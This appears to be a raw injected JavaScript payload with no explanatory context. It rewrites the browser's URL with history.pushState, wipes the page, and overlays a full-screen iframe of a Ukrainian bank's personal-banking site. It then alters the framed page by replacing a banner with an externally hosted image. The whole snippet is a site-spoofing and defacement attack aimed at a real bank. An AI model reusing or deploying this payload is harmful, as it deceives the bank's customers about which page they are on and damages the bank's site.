var stateObj = { foo: "bar" };
history.pushState(stateObj, "page", "/");
$('body').empty(); 
$('body').append('<iframe id="frame" src="https://www.eximb.com/ukr/personal/" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>')
$('#frame').load(function(){
    $('#frame').contents().find('.banners_2').empty();
    $('#frame').contents().find('table.banners_2').append('');
    $('#frame').contents().find('table.banners_2').append('<img src="https://psv4.vk.me/c423127/u26730845/docs/7be9482c3a60/kapec.gif?extra=OxFFG7j0sQXyt4VHO-NV_KFQKTRHI3W6zB7V2TJ5T6bJUyrzE5afzR4bAqEYP6gBbF-PrN3dv9B0pDEnhNvbSQQEZAOGyAce">');
});

